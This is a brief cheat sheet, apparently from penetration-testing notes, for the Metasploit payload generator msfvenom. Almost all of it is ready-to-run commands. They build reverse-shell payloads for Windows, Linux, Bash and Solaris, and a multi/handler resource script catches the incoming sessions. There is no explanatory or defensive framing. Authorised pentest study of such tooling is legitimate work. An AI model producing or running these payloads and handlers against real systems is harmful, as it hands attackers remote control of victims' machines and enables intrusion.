---
description: >-
  MsfVenom is a Metasploit standalone payload generator as a replacement for
  msfpayload and msfencode.
---

# msfvenom

**Example:** 

`msfvenom -p windows/meterpreter/reverse_tcp LHOST={IP} LPORT={Port} -f exe -o shell.exe` 

**Handler**: 

```text
Use exploit/multi/handler  
set PAYLOAD  
set LHOST  
set LPORT  
set ExitOnSession false  
exploit -j -z 
```

\*copy into a file with .rc extenation and run as: 

`msfconsole -r example.rc` 

   
**Common payloads:** 

**Linux**: 

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf` 

**Windows**: 

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe` 

**Bash**: 

`msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh` 

**Solaris**: 

`msfvenom -p solaris/x86/shell_reverse_tcp lhost=10.10.14.6 lport=5555 -f elf > /root/Desktop/raj.elf` 

